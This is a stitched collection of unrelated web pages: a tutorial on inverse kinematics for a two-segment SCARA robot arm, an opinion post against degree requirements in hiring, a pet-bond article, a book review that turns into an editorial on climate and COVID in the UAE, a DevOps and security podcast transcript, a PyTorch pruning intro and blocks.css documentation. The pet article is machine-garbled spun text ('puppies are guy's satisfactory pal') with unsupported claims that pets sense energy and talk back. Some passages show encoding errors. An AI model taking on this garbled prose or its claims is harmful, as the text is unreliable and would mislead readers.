<p>We just need to look at each segment of a robot’s arm–the coordinates of the segment’s base, the direction of the joint’s axis, the angle between this segment and the next one, and the length of the segment–in order to calculate where the end of this segment is. Repeat this with each segment, until we arrive at the robot’s hand. Et voilà: we determined the hand’s position.</p>
<p>This is called forward kinematics.</p>
<h2 id="inverse-kinematics">Inverse kinematics</h2>
<p>Now the robot’s arm must adjust each joint’s angle in order to move its hand over the cup. This is quite the opposite of the previous calculation - here, we start with a given position and want to know how to rotate each segment of the arm.</p>
<p>It turns out that this is <a href="https://en.wikipedia.org/wiki/Arm_solution">much harder</a> than the forward case. And whenever something is hard to solve, there are usually several different approaches available for solving that problem. For inverse kinematics, there are three of them:</p>
<ol>
<li>The algebraic approach: This basically works by solving (frankly, rather complex) matrix equations.</li>
<li>The geometric approach: The idea is to combine knowledge about the robotic arm’s geometry with suitable trigonometric formulas.</li>
<li>The numeric approach: Take a guess and look how far we are off. Move one or more segments to locally minimize the error. Repeat.</li>
</ol>
<p>Which one to pick? After all, each of them has its raison d’être.</p>
<p>For the sake of brevity, let’s drop the first one. It involves a lot of matrix calculations, and frankly, I haven’t done any since the last millennium or so.</p>
<p>The second one, the geometric approach, can become quite complex when the robot’s arm consists of many segments and joints. Luckily, all complexity vanishes in the case of a simple robotic arm with only two segments, so let’s go with this approach. (In a future article, I’ll give the numeric approach a try.)</p>
<p>At this point, I must admit that when I started working on this article, I expected that the formulas for the simple two-segment arm could easily be generalized to multi-segment, multi-joint robotic arms, but I found that this is not the case. So for this article, we’ll stick with what is probably the most simple robotic arm with rotary joints.</p>
<h2 id="the-scara-robot">The SCARA robot</h2>
<p>Our robotic arm shall meet the following requirements.</p>
<ul>
<li>The arm has only two segments of fixed length.</li>
<li>The segments can only rotate around their base joint; there is no sliding movement.</li>
<li>The axes of both joints have the same direction.</li>
<li>There is no hand attached to the end of the arm. (Robot hands would have additional degrees of freedom, and remember that we want to keep things simple. Now you know why our robot just serves tea.)</li>
</ul>
<p>A robot of this kind is called a <a href="https://en.wikipedia.org/wiki/SCARA">SCARA robot</a>.</p>
<p>Here is a schematic diagram of our robot:</p>

<p>Let me just tweak the diagram a little by replacing some of the labels and adding one line and two angles:</p>
<p><img src="https://appliedgo.net/media/roboticarm/robotarm.png" alt="The SCARA robotic arm as a triangle"></p>
<p>This diagram tells us a couple of things:</p>
<ul>
<li>The segments have the length <em>len1</em> and <em>len2</em>, respectively.</li>
<li>The root joint describes an angle <em>A1</em> measured from the x axis.</li>
<li>The second joint describes an angle <em>A2</em> measured from the first segment (counterclockwise in both cases).</li>
<li>The tip of segment 2 points to <em>(x,y)</em>, and we want to calculate back from that point to the yet unknown values of <em>A1</em> and <em>A2</em>.</li>
</ul>
<p>In the diagram you also see a new dotted line named <code>dist</code>. It points from <em>(0,0)</em> to <em>(x,y)</em>, and as you can easily see, the three lines <code>dist</code>, <em>len1</em>, and <em>len2</em> define a triangle. Furthermore, <em>dist</em> divides angle <em>A1</em> into two angles <em>D1</em> and <em>D2</em>.</p>
<p>Now is a good moment to dig out an old trig formula you may remember from school: The law of cosines.</p>
<p><img src="https://appliedgo.net/media/roboticarm/lawofcosines.png" alt="The Law of Cosines"></p>
<p>The law of cosines (see the first formula in the figure above) is a generalization of the Pythagorean theorem (c<sup>2</sup> = a<sup>2</sup> + b<sup>2</sup> for right(-angled) triangles) to arbitrary triangles. We do not need the basic form, but rather the transformed version that you can see below the original formula. With this version, we can calculate angle <em>C</em> from the triangle’s sides <em>a</em>, <em>b</em>, and <em>c</em>. This comes handy in two places, as we’ll see shortly.</p>
<p>So how do we calculate <em>A1</em> and <em>A2</em>?</p>
<ul>
<li>
<p>From the robotic arm diagram above (the one with <em>D1</em>, <em>D2</em>, <em>dist</em>, etc), we can directly derive the first formula:</p>
<pre><code>A1 = D1 + D2
</code></pre>
</li>
<li>
<p><em>D1</em> is fairly easy to calculate. In the following diagram, <em>x</em>, <em>y</em>, and <em>dist</em> define a right-angled triangle. Here, <em>D1</em> can be calculated in two ways: The arcsine of <em>y/dist</em> or the arctangent of <em>y/x</em>. As we have x and y readily available, let’s choose the arctangent formula.</p>
<p>However, there is a problem hidden here. The formulas certainly are correct if x and y are positive, but what if either of the two, or even both, are negative? Luckily, a solution is available in form of a method from the standard library: <code>math.Atan2(y, x)</code>. It delivers the correct result for all possible combinations of x and y. (More details <a href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Application:_finding_the_angle_of_a_right_triangle">on Wikipedia</a>.)</p>
<p><img src="https://appliedgo.net/media/roboticarm/arctan.png" alt="D1 is calculated as arctangent of y/x"></p>
</li>
<li>
<p><em>D2</em> requires the law of cosines.
Basically, we just map our “robot triangle” to the “law of cosines” triangle by using <em>dist</em> as <em>a</em>,
<em>len1</em> as <em>b</em>, and <em>len2</em> as <em>c</em>. The resulting angle <em>C</em> is our <em>D2</em>.</p>
<p><img src="https://appliedgo.net/media/roboticarm/calcd2.png" alt="D2 and the law of cosines"></p>
<ul>
<li>Now only <em>A2</em> is left. Luckily, we can reuse the law of cosines for this. We only need to map our triangle to the one from the law of cosines with different parameter mappings than for <em>D2</em>: <em>len1</em> as <em>a</em>, <em>len2</em> as <em>b</em>, and <em>dist</em> as <em>c</em>.</li>
</ul>
<p><img src="https://appliedgo.net/media/roboticarm/calca2.png" alt="Calculating A2"></p>
</li>
</ul>
<p>And that’s it. Let’s pour this into code now.</p>
<h2 id="the-code">The code</h2>
</div><div>
<h2 id="homework-assignment">“Homework assignment”</h2>
<p>Why does <em>A1</em> evaluate to <code>NaN</code> (“Not a Number”) when we try moving the arm to (0,0)?</p>
<p>Hint 1: It is about the law of cosines function.</p>
<p>Hint 2: The arm does not form a triangle in this case. (Yes, this hint is actually a spoiler, sorry…)</p>
<h2 id="outlook">Outlook</h2>
<p>In a future article we’ll look into the numeric approach. That is, we let the robot iteratively move its arm in small steps until it reaches the target.</p>
<p>Next week’s article is a lightweight take on Dependency Injection.</p>
<p>Until then, have fun!</p>

<p>Updates</p>
<p>2017-01-13: Fixed: The code uses Atan2 to calculate D1, but the text used Pythagoras.

<p><span>Y</span>esterday, I got into a verbal altercation at Starbucks.</p>
<p><span>An older man, talking very loudly, said something along the lines of “My son is golden because he has a degree from Stanford University.”</span></p>
<p><span>This comment really infuriated me because this type of outdated thinking—that a college degree from an elite, pricey university means you’re set for life—must die immediately. It falsely </span><b>signals</b><span> to employers that you’re better than the average Jane just because you have a piece of paper. In reality,</span><a href="https://www.americaspromise.org/news/pbs-newshour-biggest-predictor-college-success-family-income"> <span>all it really signals is your family’s socioeconomic status</span></a><span>.</span></p>
<p><span>So I interjected and said, “Let me guess… You paid for your son’s education.”</span></p>
<p><span>“I did,” he said. “My son’s grandfather was Herbert Hoover, and my son’s degree is like gold.”</span></p>
<p><span>[Eye roll]</span></p>
<p><span>I preceded to tell him that it doesn’t matter if you have a college degree anymore to do today’s jobs and that he was basically bragging about his family’s socioeconomic status, not his son’s actual achievements. I tried to elaborate about the inequalities of higher education and why it’s an outdated metric of future success. I explained why employers are absolutely wrong for thinking his son is better than someone without a degree or a degree from a public university.</span></p>
<p><span>Then he told me to go fly a kite, because that’s usually what happens when people are wrong and have zero evidence that their stance is right and yours is wrong. (I’m always open to new ideas, SO LONG AS you present trustworthy facts, stats, and research.)</span></p>
<p><span>For the record, this man is an out-of-touch elitist, and I stand by everything I said to him.</span></p>
<p><a href="https://www.nytimes.com/interactive/projects/college-mobility/stanford-university"><b>Fun fact</b></a><b>: The median family income of a student from Stanford is $167,500, and 66% come from the top 20%.

<h2><span id="Degree_requirements_lead_to_less_diversity"></span><b>Degree requirements lead to less diversity</b><span></span></h2>
<p><span>Recruiters use software, known as Applicant Tracking Systems (ATS), which I discuss in detail in a </span><a href="https://www.thevectorimpact.com/how-to-apply-for-jobs-online/"><span>previous article</span></a><span>. ATS collect, sort, and filter job applicants who apply through an online form.</span></p>
<p><span>They use this tool because the average job post receives 250 applications today, and they need a way to save time filtering down candidates.</span></p>
<p><span>Sometimes, online application forms will feature “knockout questions,” like “Where did you graduate from?” “What year did you graduate?” and “What did you major in?” These are meant to automatically weed out candidates who don’t meet certain criteria.</span></p>
<p><span>For instance, if I—a college dropout—were to apply to a job with these knockout questions, I’d automatically be filtered to the rejection pile, with not one human actually taking the time to even scan my resume. All because I don’t have a Bachelor’s degree, despite my 10 years of professional, proven experience.</span></p>
<p><span>Even if application forms don’t feature knockout questions, recruiters are likely inputting “keywords” into their ATS, searching for words like, “Bachelor’s,” “Harvard,” etc., just to quickly filter down the amount of resumes they have to review.</span></p>
<p><span>Let me be clear: Filtering candidates by degree is the epitome of wrong and legally,</span><a href="https://www.nolo.com/legal-encyclopedia/is-discriminatory-require-applicants-college-degree.html"> <span>it’s actually discriminatory</span></a><span>, which could be a massive liability for companies requiring a Bachelor’s degree or higher to even be considered for employment.</span></p>
<p><span>This sounds like crazy fake news, but according to an article on the reputable legal encyclopedia,</span><a href="https://www.nolo.com/legal-encyclopedia/is-discriminatory-require-applicants-college-degree.html"> <span>NOLO</span></a><span>, I’m right.</span></p>
<p><span>In the post, a reader asks if requiring a college degree for employment is illegal:</span></p>
<div>
<p><b>I work for a large nonprofit employer whose mission is to help inner-city children finish high school and go on to college.</b></p>
<p><span>We do fundraising, provide tutors and coaches, work with teachers and parents, and help school districts come up with strategies and resources to reduce dropout rates, among many other things. Our employees do everything from sending out mailings and answering phones to lobbying Congress to helping kids with their math homework and college applications.*</span></p>
<p><span>Recently, the Board decided to require all new employees to have a college degree. </span><b>The Board feels that it would be great for the kids and their families we work with to see the benefits of staying in school; the Board has also said that having employees who never finished high school or college runs counter to the message we’re trying to send about the importance of education.</b></p>
<p><span>I can see their point, but I’m concerned that this requirement might screen out large numbers of applicants of color. Is it legal for us to adopt this hiring requirement?*</span></p>
</div>

<p><b>*Side-note:</b><span> Why are so many entities STILL preaching college as the only way to get a job and succeed in life, when 50% of grads are underemployed or unemployed today? See chart below.</span></p>

<p><b>NOLO’s answer:</b></p>
<div>
<p><span>Whether or not a hiring requirement is discriminatory depends on its intent and its effect. Some employers adopt screening tests or criteria with the purpose of screening out certain applicants. For example, imposing a strength test would have the effect of screening out larger numbers of women. If an employer’s intent is to discriminate, and its hiring criteria are simply a smokescreen for this true purpose, then the employer is discriminating. </span><b>But even if an employer has no intent to discriminate, its hiring criteria may have that effect.</b><span> If a selection test or requirement has a disproportionate effect on applicants in a particular protected category, that might be illegal discrimination. </span><b>The key is whether the requirement is truly necessary to do the job.</b><span> For example, a strength test might screen out disproportionate numbers of female applicants, but might also be necessary for a job as a firefighter, construction worker, or logger.</span></p>
<p><b>An employer whose screening test or requirement has a disparate impact on a protected group must show that the requirement is job-related and consistent with business necessity.</b><span> This is intended to be a difficult hurdle, but not an impossible one. For example, an attorney needs to pass the bar exam to practice law, so requiring applicants for an associate position at a law firm to be admitted to the bar would meet this test. Similarly, </span><b>many skills tests</b><span> would pass legal muster, as long as the exam tested skills that truly were necessary to do the job.</span></p>
<p><b>Degree requirements are more slippery, in part because it isn’t clear exactly what particular skills, aptitudes, or abilities a degree confers</b><span> (unless a particular degree is required for licensing, like a law degree or medical degree generally is). </span><b>And, degree requirements often do have a disparate impact against African American and Latino applicants.</b></p>
<p><span>…</span></p>
<p><span>Your Board has expressed a nondiscriminatory reason for its new requirement. </span><b>But a court would look at whether it really is necessary to have a college degree to do every job at your company.</b> <b>The variety of jobs employees hold is going to be a major strike against the requirement: It seems pretty evident that someone can stuff envelopes, answer phones, manage databases, and do a wide variety of other work without a college degree.</b></p>
<p><span>And, </span><b>even if a court were to accept the employer’s “role model” argument for certain positions, an applicant could still win a discrimination lawsuit by showing that there are less discriminatory alternatives available.</b><span> For example, an employee might be an even more effective advocate for staying in school if he or she can share how difficult it has been to succeed without a degree. An employee who has dropped out might be better able to relate to the decisions facing at-risk kids and better able to help them make a different choice. </span><b>In short, if a degree requirement has the effect of screening out larger numbers of African American and Latino applicants, your employer will face a very difficult task in trying to justify the disparity.</b></p>
</div>
<p><span>That last sentence is key. Today, the hot topic in HR today is “diversity.” Diversity for women, for latinos, for African-Americans, etc. But these are actually vanity metrics at best (or total lies at worst) if the company requires a college degree for employment—whether or not they realize it.</span></p>
<p><b>Degree requirements actually lead to less diversity.</b></p>

Did that there may be a effective bond among animals and human beings?<br>

one of the more stunning and unifying factors of humanity is witnessing the super lengths a few animal lovers will go to for his or her animal partners.<br>

Non animal lovers won't get it in any respect... yet.<br>

So right here's the aspect: They enjoy a mutual, deep bond and connection that is tough to provide an explanation for or define, however it would not make it any much less real or tangible.<br>

one of the many advantages of having pets is when they show you who you certainly are. They do this by reflecting, mirroring and appearing out aspects of your inner self. And while you be aware of their messages they will let you become a better character.<br>
that is the phenomenon I name The Human Animal BodyMind Connection and it's an exquisite thing that after you understand it, it'll alternate your lifestyles.<br>
They haven't any capacity for spite or guile.<br>
while you concentrate to them, what are they announcing about how you are worrying for yourself... and them?<br>
they will innately reflect your feel of fitness and well-being. they may be attuned in your power - mind, frame and feelings - and might ship you messages about brewing troubles long before others can understand symptoms of trouble.<br>
And, they may be a tremendous comfort at some point of times of pressure, isolation or loneliness.</p><blockquote><b>Health benefits of having pets</b></blockquote>

we've got all heard clichés like, "puppies are guy's satisfactory pal."
but have you ever puzzled why? i will tell you my belief...<br>
dogs are loyal to a fault.<br>
Animals locate joy within the simplest, smallest matters.<br>
They don't have any want for excuses or pretense, they are handiest ever being themselves.
They doze off unencumbered with the aid of daily concerns and wake up each morning with a clean slate, geared up to take on the sector with sparkling eyes and spirits.<br>
Their buoyancy, resilience, devotion, willpower, and optimism are infectious.<br>
yet, many animals also have an innate feel when a person is in want of guide. They don't always take on the fear... they honestly attain out to consolation a person in ache.
now not each dog, cat, or horse can be a therapy animal who trains for care in a health center, as a provider animal or accomplice all through instances of crisis...<br>
but you ought to know that your pet is choosing up alerts from you always.
Your horse will experience the tension in you and attempt to make feel of it, then determine how to help you with that.<br>
Your canine will comply with you around the house when they examine bad strength trying to discern out what is wrong and the way to help you.<br>
you might assume they're being a pest - particularly while you're feeling agitated. stop and receive the present of their love for what it is, and have a conversation with them about what's bothering you. you'll feel better for it, and when you recognise how to talk with animals they may have the ability to inform you what they think too.</p><blockquote><b>Animals understand when things are going wrong, but they lack the power to fix them... or do they?</b></blockquote>

Pets might not will let you withdraw, isolate, or cocoon all on my own

it's very tough to socialize in trendy international... and that may magnify despair, tension, and a sense of isolation.<br>

Your pet needs your care and attention all through desirable times. They need to play games with you, pass for walks with you, study from you. And, at some point of horrific instances they nonetheless need all those things, but can sense that things are not right, when you're in pain.<br>

whilst your canine turns into obsessed on bringing you a toy, or appears to be nagging you to go for a stroll, pay attention to them.<br>

Your cat might be circling your house office chair, pouncing for your computer, intent on distracting you... however absolutely, they're in all likelihood telling you it's time to alternate your consciousness.<br>

often they will word that your respiration has end up shallow, your flow is weakening, and your strength is faltering... it worries them. Time to take a spoil!<br>

Time spent caring for a pet releases serotonin and dopamine, two hormones that cause a pleasure reaction.<br>

Pets are relatively intuitive creatures. And the more time they spend with you, the better they get to realize you and end up attuned for your lows and highs.</p><blockquote><b>The benefits of having pets go beyond heroic rescue dogs</b></blockquote>

<p>For an author whose natural range tends to settle somewhere north of 500 pages of beautifully crafted fiction – his sixth, highly anticipated novel, <em>Crossroads</em>, is due later this year and promises to be another discursive, immersive classic – you could easily write off <a href="https://www.amazon.co.uk/What-If-We-Stopped-Pretending/dp/0008434042/ref=sr_1_1?dchild=1&amp;keywords=franzen&amp;qid=1612359830&amp;sr=8-1"><em>What If We Stopped Pretending</em></a> as a non-fiction amuse bouche to turn your nose up at while you impatiently wait for the main course to arrive. Especially so, when the material involved is reissued work.</p> 
<p>Fans of the author will tell you, however, that his non-fiction volumes – old, new or reissued – are just as compelling as his novels. And so it is with this release, too.</p>

</div> 
<p>Franzen being Franzen means that <em>What If We Stopped Pretending</em> is an exquisitely rendered discussion on one of the most difficult conversations of our age.</p> 
<p>The author has previously angered both sides of the climate debate and been accused of being either too forceful or too weak. What emerges here is an accidental polemic and one that's worth re-evaluating, especially because our world has changed so dramatically in the past 12 months.</p> 

<p>He believes that the world is too far down the track to avoid a climate change catastrophe. It is a case of when, not if, the whole system collapses in on itself. The goal has been clear for decades, the evidence to support it is indisputable but, he writes, we have made no progress towards reaching it.</p> 
<p>He paints a bleak portrait of collective failure to solve the puzzle, imagining any future reckoning as a sequence of “severe crises … things will get very bad, but maybe not too soon, and maybe not for everyone. Maybe not to me”.</p> 
<p>This is where the work begins to intersect with our lives today.</p> 
<p>It is a little over a year since the <a href="https://www.thenationalnews.com/opinion">Covid-19 crisis</a> began to rain down on us. The first cases were identified in the UAE at the end of January 2020. By the end of February, schools across the country were cancelling trips. By March 8, schools were closed. Within days, the World Health Organisation had declared a pandemic. Within a week, the UAE’s borders were closed. And so it went on, locally, nationally, regionally and internationally.</p> 
<p>The crisis, which we all may have initially imagined as a short, sharp shock, punctuated by short-term stay-at-home orders, movement permits and night-time street sterilisation campaigns, became a long and intricate fight – a sequence of severe crises, which were delivered unevenly and in complicated waves.</p>

<p>Most of us have endured some form of pain during the pandemic – of separation, loss, complication or even infection – but we have also been made more profoundly aware of how the actions of the individual and the community can truly make a difference. Governments may introduce and revise guidelines for containing the spread of the virus, but ultimately action is most effectively driven by each one of us acting responsibly and in the interests of the wider community in which we live.</p> 
<p>The distribution of vaccines in the UAE shows the power of what can be achieved by working together. By midweek, the National Emergency Crisis and Disasters Management Authority recorded that more than <a href="https://www.thenationalnews.com/gulf-news/coronavirus-vaccine-in-the-gulf-what-we-know-so-far-1.1158405">3.5 million vaccine doses</a> had been administered in the country.</p> 
<p>Health official Dr Farida Al Hosani said this week that “we are seeing good progress on a daily basis”. The reasons for that progress are many, including the liberal use of public awareness campaigns, the establishment of vaccine distribution centres in accessible places, the ease of registration to receive the vaccine and so on. But ultimately for the drive to be as successful as it has been to date, it also requires each individual to understand that they have a role to play by <a href="https://www.thenationalnews.com/opinion/comment/to-get-the-jab-done-governments-must-show-patience-and-empathy-1.1121842">taking the jab</a>.</p>

<p>Returning to Franzen, the climate change crisis requires collective action as well, but it also needs each individual to make the right choices about how they lead their lives and to understand how even small changes to their lifestyles can still make a difference. Each of us, he says, has an ethical choice to make. “If collective action resulted in just one fewer devastating hurricane … it would be a goal worth pursuing,” he adds.</p> 
<p>The pandemic has also made it clear that generational crises are not abstract concepts but visceral realities. It has spurred some multilateral movement to combat coronavirus and given us a greater sense of the vast amount of effort, resource and capital that is required to turn the tide. We cannot just rebuild, we must regenerate. We cannot return to normal or even the so-called new normal. The challenges are too urgent and too complex to snap back into an approximation of the old order.</p> 
<p>Earlier this week, John Kerry, who is the Biden administration’s climate change envoy, <a href="https://www.thenationalnews.com/uae/environment/us-climate-envoy-john-kerry-to-build-ties-with-uae-to-boost-green-agenda-1.1157382">held talks with Dr Sultan Al Jaber</a>, his UAE counterpart. Mr Kerry said the US was prepared to re-energise the battle to protect the environment and spoke about making up for “lost years with humility and ambition”. That is precisely the prescription that it required to bring about a better, less calamitous future.</p>

			<p><strong>[INTERVIEW]</strong></p>
<p><strong>[00:01:31] Guy Podjarny:</strong> Hello, everybody. Thanks for tuning back in to The Secure Developer. Today, we’re going to have a DevOps-flavored episode here. I’m really happy to have with us James Turnbull, who is a VP of Engineering at Timber and also kind of a long time DevOps thought leader. He has been the chair of Velocity, has sort of been very much a core part of the DevOps journey, making him especially qualified to discuss a little bit about how it’s similar or different to the DevSecOps journey. James, thanks for coming on to the show.</p>
<p><strong>[00:02:01] James Turnbull:</strong> Thank you for having me.</p>
<p><strong>[00:02:02] Guy Podjarny:</strong> James, before we dig into the topic of substance, tell us a little bit about what is it that you do and maybe your journey and how we touch security?</p>
<p><strong>[00:02:10] James Turnbull:</strong> Sure. I lead engineering product teams. At the moment, I’m working a product called Vector, which is an open source observability tool. I’ve been an engineer for about 25 years. I think it’s too many years to start citing that, and I started my career off largely in sort of enterprise, banking finance, as a security engineer and a security architect for a few years in a retail bank, I built perimeter systems and ATM networks and stuff like that. In the last 10 years or so, I’ve largely worked in high-growth startups. I was an early employee at Puppet, configuration management tool. I was an early employee at Docker obviously doing containerization. I was a CTO at Kickstarter and I have done similar sorts of roles over the last few years. As you said, I was the chair of the Velocity conference for a couple years and also I write technology books. I’ve written 11 books about engineering and infrastructure.</p>
<p><strong>[00:03:00] Guy Podjarny:</strong> 11 books is impressive. I have a few under my belt but 11 books is definitely a notable number there.</p>
<p><strong>[00:03:06] James Turnbull:</strong> No kids I think is probably an advantage.</p>
<p><strong>[00:03:08] Guy Podjarny:</strong> It makes for some free time. So, I’m curious a little bit. Quite a few guests that came onto the show have gone into security from maybe the operations, and you actually were in security but then you moved outwards. Do you remember that transition, that decision point of whether you want to leave security and go to a role that doesn’t have security in the title?</p>
<p><strong>[00:03:29] James Turnbull:</strong> Yeah. I was managing a CERT team, a Computer Emergency Response Team, at a retail bank, and one of the things I’ve been thinking about last three or four years before that was sort of large scale infrastructure management. One of the very frustrating things about being a security person in a large organization is you don’t control the infrastructure. You are largely dependent on infrastructure teams to provide you with information about vulnerabilities, about the state of the infrastructure. You’re largely reliant on them to do remediation for you. They would obviously come to me and say, “We don’t have any tools that allow us to mass maintain, mass patch all of these systems. We don’t use large-scale package management. We don’t have any configuration management tools.”</p>
<p>I sort of started to look in that area, about the same time I found Puppet. I started working on the open source Puppet tool. When they raised some money, I thought I can see the viability of this tool. I work in the environments where this is a desperate need. So, I came on board at Puppet to try and bring some of that experience, and I think I was probably our first pre-sales person, as well as being head of community and professional services, and a bunch of other things along the way. I tried to inject that flavor of this is what a large enterprise looks like. This is their experience. This is the empathy I have for their problems. The very first customer, I was involved in the New York Stock Exchange, customers that sort of flavor where my experience resonated.</p>
<p><strong>[00:04:47] Guy Podjarny:</strong> That’s a great story, and it’s interesting around this, taking ownership basically or being frustrated about not being able to control and address those issues. You very much scratched your own itch with the move to the solution itself in the world of Puppet. That’s pretty good.</p>
<p>It’s actually interesting that Puppet, I think, recently, maybe in the last couple of years, have actually launched a remediation-focused solution that indeed focuses. It sounds maybe like on the same problem space that you’ve just been describing as [inaudible 00:05:15].</p>
<p><strong>[00:05:15] James Turnbull:</strong> Yeah. I’ve had a couple of steps at it. [inaudible 00:05:17] was a product manager there for a while, originally built a sort of patch management, vulnerability management system like 2012 or 2013 but it proved to be – It’s a non-trivial problem to solve. But, yes, it’s definitely one of those areas where we have a lot of information about vulnerabilities. We have a lot more ability to interrogate hosts and work out what’s wrong. We still have the challenge of how do you remediate those in a safe and reliable way? How do you ensure that there’s no downtime?</p>
<p>I think those problems are the ones that Puppet is trying to work out, how do we solve? How do we take these feeds of data and turn them into actions or execution that organizations can undertake?</p>
<p><strong>[00:05:55] Guy Podjarny:</strong> Yeah, very much. I mean, there’s also been some surrounding changes with the adoption of Kubernetes, as you pointed out, the ability to interrogate environments and ask for more information.</p>
<p>Let’s indeed maybe go down this path of the DevOps analogy and maybe a reverse path of your journey and talk a little bit about the analogies in the DevOps journey and in these changes of tools. Where is it that we can learn from them in security versus where do they defer and should be defined differently?</p>
<p>I thought maybe a helpful model for us to try and follow here is this people process technology type trial. Let’s start from that first one there, people. Maybe I’ll start by having you describe because people have different definitions of the people aspect of DevOps. When you think about people change is required to do DevOps successfully, how do you answer that?</p>
<p><strong>[00:06:45] James Turnbull:</strong> I mean, I think the people aspect of DevOps to me is probably the most important aspect of it. My best interactions or my best successes in building things or working on things or operating things was because I had good relationships with the folks all part of the process, whether they be software engineers, DBAs, or security people, or audit risk people. It’s a relationship-driven process.</p>
<p>To me, the DevOps thing is really about building a bridge between folks who previously perhaps didn’t have a conversation. There wasn’t necessarily any antagonism there. It was literally like, I do a job. I build an artifact. I give that artifact to some other people. Those other people do something with it, and sometimes they come and tell me that it’s broken.</p>
<p>I mean, obviously there’s a little bit of friction in there with regards to like the op side of things, get other people that live with the outage and so forth, but it’s really about like, okay, the Ops people have a set of expectations and constraints, and they have some needs. If they had a conversation with the people building the thing in the first place at first principles, would some of that process be smoother? Would the friction be reduced? Would the potential for outages be reduced?</p>
<p>To me, having a conversation, having a good relationship, understanding everybody’s needs is the key to that sort of DevOps thing. Obviously, there’s lots of tools and those bits and pieces in that automate a number of those processes and sort of reduce the human effort requirement, but it all stems from having that conversation in the first place.</p>
<p><strong>[00:08:12] Guy Podjarny:</strong> Yeah. I very much relate to this but I guess maybe let me ask you, from a security change perspective. Now, when you think, okay, we’re going to do DevSecOps, and I’m using this buzzword fairly loosely over here, it’s just a simple way of saying embed security into the DevOps existence if you will, or processes, do you see the same? Do you also think really the most important piece is the people piece?</p>
<p><strong>[00:08:35] James Turnbull:</strong> I think so. I think there’s a couple of levels of this. When I started out in security, there was a generation or even a couple of generations before me who saw their role as saying no to things. They really saw themselves as guardians of the business and the enterprise. The easiest way to safeguard those organizations was to say, “No, we shouldn’t do this.”</p>
<p>I probably belong to the next generation that came along. I left security about the same time as this was becoming more sort of status quo, but a bunch of people who really said that our job is not to say no. Our job is to say present the risk, present options about how you might mediate the risk in some way, with a view to like allowing the business to do what it needs to do to make money in a fast and efficient and safest way possible. It’s their risk appetite and not our risk appetite. Our job is to explain to them the decisions they’re making and what the impact is, but it’s really their ownership. They own the business risk in a way that we don’t.</p>
<p>I feel like this resonates really strongly with me in this sort of DevOps sort of the world is ultimately the outcome is you want to move fast and ship things, right? You want to be able to take the time from code, not earning you any money on a developer’s desktop, to code running in production, and making your business money. One of the sort of caveats in there, one of the things in there, is you want to do that in a secure way, as well as an efficient set of ways. Security becomes another stakeholder in that DevOps life cycle, and their job is really to say, “Okay. We have policy or we have process, or we have information we need from you that bubbles up and allows us to do our jobs. If we give you that …</p></div></div></div>

      <h3 id="introduction">Introduction</h3>

<p>State-of-the-art neural networks nowadays have become extremely parameterized in order to maximize the prediction accuracy. However, the model also becomes costly to run and the inference latency becomes a bottleneck. On resource-constrained edge devices, the model has a lot of restrictions and cannot be parameterized as much as we can.</p>



<p>Sparse neural networks could perform as good as dense neural network with respect to the prediction accuracy, and the inference latency becomes much lower theoretically due to its small model size. Neural network pruning is a method to create sparse neural networks from pre-trained dense neural networks.</p>



<p>In this blog post, I would like to show how to use PyTorch to do pruning. More details about the mathematical foundations of pruning for neural networks could be found in my article <a href="https://leimao.github.io/article/Neural-Networks-Pruning/">â€œPruning for Neural Networksâ€�</a>.</p>

<h3 id="pytorch-pruning">PyTorch Pruning</h3>

<p>To demonstrate the effectiveness of pruning, a ResNet18 model is first pre-trained on CIFAR-10 dataset, achieving a prediction accuracy of $86.9\%$. The pre-trained is further pruned and fine-tuned. The number of parameters could be reduced by $98\%$, i.e., $50\times$ compression , while maintaining the prediction accuracy within $1\%$ of the original model. The source code could be downloaded from <a href="https://github.com/leimao/PyTorch-Pruning-Example">GitHub</a>.</p>



<p>The pruning is overall straightforward to do if we donâ€™t need to <a href="https://pytorch.org/tutorials/intermediate/pruning_tutorial.html#extending-torch-nn-utils-prune-with-custom-pruning-functions">customize the pruning algorithm</a>. In this case, ResNet18 is able to achieve $50\times$ compression by using L1 unstructured pruning on weights, i.e., prune the weights that have the smallest absolute values.</p>

    <p><a href="https://github.com/thesephist/blocks.css">blocks.css</a> adds a layer of dimension to your web elements.
        It's light enough that it takes no time to set up or load, but interesting enough that it can serve as the only
        major CSS on the page.</p>

    <h2>Basics</h2>

    <p>blocks.css is a single stylesheet. Get started by adding the stylesheet to your page's head.</p>

    <pre>&lt;link rel="stylesheet" href="https://unpkg.com/blocks.css/dist/blocks.min.css" /&gt;</pre>

    <p>This is a blocky button. It's interactive â€“â€“ try hovering and clicking on it.</p>
    

    <p>You can make any element blocky by giving it the class <code>block</code>.</p>

    <pre>&lt;button class="block"&gt;Hello, World!&lt;/button&gt;</pre>

    <h3>Accents</h3>

    <p>This is an <em>accent</em> button. You can make a block accented with the class <code>accent</code>.</p>
    

    <h3>Pills</h3>

    <p>This is a <em>round</em> button, also sometimes called a "pill". You can make a box round with the class <code>round</code>.</p>
    

    <h3>Fixed blocks</h3>

    <p>This is a <em>fixed</em> button, which means it won't respond to any of your inputs or interactions. You can make
        a block fixed with the class <code>fixed</code>.</p>
    

    <h3>Wrapper blocks</h3>

    <p>Sometimes, you want to blockify an element like <code>img</code> or <code>input</code>. But these elements can't
        have children like <code>::before</code> and <code>::after</code> elements, so blocks.css can't work its magic.
        Instead you'll have to wrap them in a <em>wrapper block</em>, using the <code>wrapper</code> class, like this.
        (The wrapper class removes padding in the block.)</p>
    <p><img src="https://linus.zone/pic" alt="Linus's picture">
    </p>

    <h3>Inline blocks</h3>

    <p>Lastly, sometimes you may want to place a block <em>inline</em>, or in the middle of a line of text. You can do
        so with an <em>inline</em> block, by adding the class <code>inline</code>. Then your blocks can be in the middle
        of text, <span>like this</span>.</p>

    <h2>Core components</h2>

    <p>We've only looked at buttons so far, but anything can be blocky. Here are a few examples.</p>

    <p>These are all just created by either adding the <code>block</code> class on a normal HTML element, or by wrapping
        normal HTML elements in <code>&lt;div class="wrapper block"&gt;&lt;/div&gt;</code>.</p>

    

    <div>
        <pre>This is a blocky code block (inside a wrapper)</pre>
    </div>

    </p>

    <div>
        <h2>This is a blocky card</h2>
        <p>... that contains many other elements</p>
        </div>

    <h2>Theming</h2>

    <p>You can theme button styles by customizing the colors, using <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/--*">CSS custom properties</a>.</p>

    <p>There are four variables that blocks.css uses:</p>

    <ul>
        <li>
            <p><code>--block-text-color</code> determines the color of text, and the border around the block and its
                shadow</p>
        </li>
        <li>
            <p><code>--block-background-color</code> is the color of the button background</p>
        </li>
        <li>
            <p><code>--block-accent-color</code> is the background color of accented buttons</p>
        </li>
        <li>
